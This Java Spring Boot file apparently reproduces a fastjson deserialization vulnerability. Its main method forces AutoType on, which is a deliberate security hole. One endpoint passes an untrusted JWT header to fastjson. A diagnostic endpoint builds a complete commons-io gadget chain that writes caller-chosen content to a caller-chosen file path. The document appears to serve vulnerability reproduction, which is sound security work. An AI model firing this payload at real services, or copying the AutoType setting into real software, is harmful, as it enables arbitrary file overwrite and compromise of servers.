package com.test;

import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;
import com.auth0.jwt.JWT;
import com.auth0.jwt.interfaces.DecodedJWT;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.web.bind.annotation.*;

import java.io.FileOutputStream;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.Map;

@SpringBootApplication
@RestController
public class App {

    static final Logger log = LoggerFactory.getLogger(App.class);

    public static void main(String[] args) {
        log.info("[DIAG] fastjson AutoType default = {}", ParserConfig.getGlobalInstance().isAutoTypeSupport());
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        log.info("[DIAG] fastjson AutoType forced ON");
        SpringApplication.run(App.class, args);
    }

    /** 复现 NotifyServiceImpl.java:150-154 */
    @PostMapping("/notify/v2")
    public Map<String, Object> notifyV2(@RequestBody Map<String, String> body) {
        String signedPayload = body.get("signedPayload");
        Map<String, Object> result = new LinkedHashMap<>();
        try {
            DecodedJWT decodedJWT = JWT.decode(signedPayload);
            log.info("[STEP1] JWT.decode OK");

            byte[] headerBytes = Base64.getDecoder().decode(decodedJWT.getHeader());
            String header = new String(headerBytes, StandardCharsets.UTF_8);
            log.info("[STEP2] header decoded, len={}, preview={}", header.length(),
                    header.substring(0, Math.min(60, header.length())));

            log.info("[STEP3] calling parseObject ...");
            JSONObject parsed = JSONObject.parseObject(header);
            log.info("[STEP3] parseObject OK, keys={}", parsed.keySet());

            String x5c = parsed.getJSONArray("x5c").getString(0);
            result.put("code", 200);
            result.put("x5c_len", x5c.length());

        } catch (NullPointerException e) {
            log.warn("[NPE] {} at {}", e.getMessage(), e.getStackTrace()[0]);
            result.put("code", 500);
            result.put("msg", "NPE - parseObject 已执行完毕");
        } catch (Exception e) {
            log.error("[ERR] {}:{}", e.getClass().getName(), e.getMessage());
            result.put("code", 500);
            result.put("type", e.getClass().getSimpleName());
            result.put("msg", e.getMessage());
        }
        return result;
    }

    /**
     * 分层诊断接口
     *
     * step=1  仅验证 Java 文件写入权限（不经过 fastjson）
     * step=2  验证 fastjson 能否实例化 LockableFileWriter（最小 payload）
     * step=3  发送完整 commons-io gadget chain
     */
    @PostMapping("/diag")
    public Map<String, Object> diag(@RequestBody Map<String, String> body) {
        String step = body.getOrDefault("step", "1");
        String file = body.getOrDefault("file", "/tmp/diag_test");
        Map<String, Object> result = new LinkedHashMap<>();

        try {
            if ("1".equals(step)) {
                // ── 纯 Java 写文件，验证权限 ──
                try (FileOutputStream fos = new FileOutputStream(file)) {
                    fos.write("java-write-ok\n".getBytes(StandardCharsets.UTF_8));
                }
                result.put("ok", true);
                result.put("msg", "Java 直接写文件成功: " + file);

            } else if ("2".equals(step)) {
                // ── 最小 fastjson payload：只实例化 LockableFileWriter ──
                // 不走 commons-io 完整链，只验证 @type 能否实例化目标类并触发构造
                String json = String.format(
                    "{\"@type\":\"org.apache.commons.io.output.LockableFileWriter\"," +
                    "\"file\":\"%s\",\"encoding\":\"UTF-8\",\"lockDir\":\"/tmp\",\"append\":false}",
                    file.replace("\\", "\\\\"));
                log.info("[DIAG2] payload={}", json);
                Object obj = JSONObject.parseObject(json, Object.class);
                result.put("ok", true);
                result.put("class", obj == null ? "null" : obj.getClass().getName());
                result.put("autoType", ParserConfig.getGlobalInstance().isAutoTypeSupport());

            } else if ("3".equals(step)) {
                // ── 完整 commons-io 链（修正后的 JSON 语法）──
                String content = body.getOrDefault("content", "FASTJSON-POC\n");
                // 用十六进制转义构造内容字节
                StringBuilder hexSb = new StringBuilder();
                for (byte b : content.getBytes(StandardCharsets.ISO_8859_1)) {
                    hexSb.append(String.format("\\x%02x", b & 0xFF));
                }
                int[] bom = new int[content.length() + 1];
                StringBuilder bomSb = new StringBuilder("[");
                for (int i = 0; i < bom.length; i++) {
                    bomSb.append(0);
                    if (i < bom.length - 1) bomSb.append(",");
                }
                bomSb.append("]");

                // 注意 charSequence 内使用 fastjson 私有 \xHH 字面量语法：
                // {"@type":"java.lang.String"  "\xHH..."}  —— 对象内无 key 的字符串值
                // 这是 fastjson 解析 String 类型的特殊路径
                String json =
                    "{" +
                    "\"@type\":\"java.io.InputStream\"," +
                    "\"@type\":\"org.apache.commons.io.input.BOMInputStream\"," +
                    "\"delegate\":{" +
                      "\"@type\":\"org.apache.commons.io.input.AutoCloseInputStream\"," +
                      "\"in\":{" +
                        "\"@type\":\"org.apache.commons.io.input.TeeInputStream\"," +
                        "\"input\":{" +
                          "\"@type\":\"org.apache.commons.io.input.ReaderInputStream\"," +
                          "\"reader\":{" +
                            "\"@type\":\"org.apache.commons.io.input.CharSequenceReader\"," +
                            "\"charSequence\":{\"@type\":\"java.lang.String\",\"val\":\"" + hexSb + "\"}," +
                            "\"encoder\":\"iso-8859-1\"," +
                            "\"charset\":\"iso-8859-1\"," +
                            "\"charsetName\":\"iso-8859-1\"," +
                            "\"bufferSize\":1" +
                          "}," +
                          "\"branch\":{" +
                            "\"@type\":\"org.apache.commons.io.output.WriterOutputStream\"," +
                            "\"writer\":{" +
                              "\"@type\":\"org.apache.commons.io.output.LockableFileWriter\"," +
                              "\"file\":\"" + file.replace("\\","\\\\") + "\"," +
                              "\"charset\":\"iso-8859-1\"," +
                              "\"encoding\":\"iso-8859-1\"," +
                              "\"lockDir\":\"/tmp\"," +
                              "\"append\":false" +
                            "}," +
                            "\"charset\":\"iso-8859-1\"," +
                            "\"charsetName\":\"iso-8859-1\"," +
                            "\"bufferSize\":1024," +
                            "\"writeImmediately\":true" +
                          "}," +
                          "\"closeBranch\":true" +
                        "}" +
                      "}" +
                    "}," +
                    "\"include\":true," +
                    "\"boms\":[{" +
                      "\"@type\":\"org.apache.commons.io.ByteOrderMark\"," +
                      "\"charsetName\":\"iso-8859-1\"," +
                      "\"bytes\":" + bomSb +
                    "}]," +
                    "\"x\":{\"$ref\":\"$.bOM\"}" +
                    "}";
                log.info("[DIAG3] payload len={}", json.length());
                JSONObject.parseObject(json);
                result.put("ok", true);
                result.put("msg", "parseObject completed, check " + file);
            }
        } catch (Exception e) {
            log.error("[DIAG ERR] step={} {}:{}", step, e.getClass().getName(), e.getMessage());
            result.put("ok", false);
            result.put("type", e.getClass().getSimpleName());
            result.put("msg", e.getMessage());
        }
        return result;
    }
}
